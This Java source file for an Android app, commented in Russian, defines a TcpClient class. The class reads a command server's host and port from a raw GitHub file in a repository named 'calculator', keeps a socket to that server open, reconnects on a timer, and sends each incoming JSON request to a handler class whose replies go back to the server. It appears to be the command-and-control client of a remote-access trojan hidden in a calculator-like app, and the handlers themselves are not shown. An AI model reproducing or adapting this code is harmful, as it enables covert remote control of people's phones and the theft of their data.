package com.test.myapp;

import static android.content.Context.POWER_SERVICE;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

public class TcpClient implements Runnable
{
    private static long MY_TIMEOUT = 120*1000;
    private Context context;
    private Thread thread;
    private Socket socket;
    private PrintWriter dataOutputStream;
    private DataInputStream dataInputStream;
    private String UrlPastbin = "https://raw.githubusercontent.com/manuq4979/calculator/master/hostport";
    private String host;
    private int port;
    private int bufferSize = 1024*200;

    public static boolean TIMER_RESTART = false;
    public static long TIMER_START_VALUE = 0;
    public static boolean RECONNECT = true;







    public TcpClient(Context context) {

        this.context =  context;
    }




    // была main()

    private void getPustbinHostAndPort() {
        try {
            Document doc = Jsoup.connect(UrlPastbin).get();
            String text = doc.body().text();
            String[] hostAndPort= text.split(":");
            this.host = hostAndPort[0];
            this.port = Integer.parseInt(hostAndPort[1]);

        } catch (Exception e) {
            // выдаст исключение, если ссылка ложная
            e.printStackTrace();
            this.host = "error";
            this.port = -1;
        }

    }

    private byte[] trimByteArray(byte[] bytes, int length) {
        byte[] trim_bytes = new byte[length];

        System.arraycopy(bytes, 0, trim_bytes, 0, length);

        return trim_bytes;
    }

    private void myTimer() {
        System.out.println("myTime() ---------------------- !!!");

        if(TIMER_RESTART) {
            System.out.println("TIMER RESTART ---------------------- !!!");
            // это откладывает срабатывание которое ниже этого:
            TIMER_START_VALUE = System.currentTimeMillis();
            TIMER_RESTART = false;
        }

        System.out.println("Время: "+(System.currentTimeMillis() >= TIMER_START_VALUE+MY_TIMEOUT));
        long t = ((TIMER_START_VALUE+MY_TIMEOUT - System.currentTimeMillis()) / 1000) / 60;
        System.out.println("Отсчет == "+t+" минут до срабатывания будильника.");
        if(System.currentTimeMillis() >= TIMER_START_VALUE+MY_TIMEOUT) {
            System.out.println("ВЕРЕМЯ ИСТЕКЛО ----------------------------------------------- !!!");
            RECONNECT = true;
        }
    }

    public void timerReconnect(long timeout) {
        System.out.println("timerRecconect() ------------------------ !!!");
        TIMER_RESTART = true;
    }



    @Override
    public void run() {
// create new socket and connect to the server



        MyHandlers myHandlers = new MyHandlers(context);
        TIMER_START_VALUE = System.currentTimeMillis();

        while (true) {


            sleep(); // ждать 3 секунды, прежде чем продолжить цикл, во избежание генерации лишнего мусора
            myTimer(); // это часть таймера в методе без цикла, а циклом ему служит этот

            if(RECONNECT) {
                if (this.socket == null) {
                    runConnect();
                } else {
                    reconnect();
                }
                System.out.println("if(RECONNECT) { ... }");

                RECONNECT = false;
            }
            System.out.println("Цикл продолжается -------------------------- !!!");

            String responseJSON;

            byte[] bytes = new byte[bufferSize];
            int length = 0;
            if(this.dataInputStream != null) {
                try { length = this.dataInputStream.read(bytes); } catch (Exception e) {System.out.println(e);}
            }

            if(length == -1) {length = 0;}
            // рестарт таймера при условии нового сообщения

            if(length != 0) {
                timerReconnect(MY_TIMEOUT);

                byte[] trim_bytes = trimByteArray(bytes, length);

                String requestJson = new String(trim_bytes, StandardCharsets.UTF_8);


                System.out.println("Response: " + requestJson);

                // Отправляем запрос в обработчик и получаем ответ для отправки
                responseJSON = myHandlers.handler(requestJson);

                this.dataOutputStream.write(responseJSON);
                this.dataOutputStream.flush();
            }

        }

    }



    // нужна чтобы перезапустить TCP клиент, а не вызвать рекурсию вида  run()->run()->run()...
    public void runConnect(){
        try {
            getPustbinHostAndPort();
            if(!this.host.equals("error")) {
                System.out.println(this.host + this.port);
            }

            System.out.println("Сокет создается ---------------- !!!");
            this.socket = new Socket(this.host, this.port);
            // socket.setSoTimeout(3000);
            // socket.connect(new InetSocketAddress(this.host, this.port), 3000);


            System.out.println("connected");

            this.dataOutputStream = new PrintWriter(this.socket.getOutputStream(), true); // ввод данных, от меня серверу
            this.dataInputStream = new DataInputStream(new BufferedInputStream(this.socket.getInputStream())); // чтение, от сервера


        } catch (Exception e) {
            System.out.println(e);
        }

        timerReconnect(MY_TIMEOUT);
        RECONNECT = true;

        return;
    }

    // вернну исключение прямо в базовый обработчик исключений, он единственный, тот что выше:
    public void reconnect() {
        System.out.println("server disconnect");
        System.out.println("Server reconnect");

        try {
            getPustbinHostAndPort();
            if(!this.host.equals("error")) {
                this.socket.connect(new InetSocketAddress(this.host, this.port));
            }

        } catch (Exception e) {
            System.out.println(e);

            // если соединение уже было установлено ранее, то я получу  java.net.SocketException: already connected
            // поэтому нужно заного создать подключение
            try {
                this.socket.close();
                runConnect();
            } catch (Exception ex) {
                System.out.println(ex);
            }
        }

        timerReconnect(MY_TIMEOUT);
        RECONNECT = true;

        return;
    }

    public void runThread() {
        this.thread = new Thread(this);
        this.thread.setPriority(Thread.NORM_PRIORITY);
        this.thread.start();
    }

    public void sleep() {
        try {
            TimeUnit.SECONDS.sleep(3);
        } catch (Exception e) {
            System.out.println(e);
        }

        return;
    }

}
